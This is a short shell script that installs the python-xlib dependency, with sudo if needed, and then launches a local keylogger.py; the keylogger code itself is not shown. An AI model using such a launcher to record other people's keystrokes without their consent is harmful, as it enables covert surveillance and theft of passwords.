if [ "$(pydoc modules | grep 'Xlib')" == "" ]; then
    echo "Installing Xlib......."
    if [ "$(pydoc modules | grep 'setuptools')" == "" ]; then
        echo "Installing setuptools......."
        sudo apt-get install python-setuptools
    fi
    cd "python-xlib-0.17/" && sudo python setup.py install;
    cd ..
else
    echo "Xlib installed already"
fi
echo "starting key logger....."
python keylogger.py
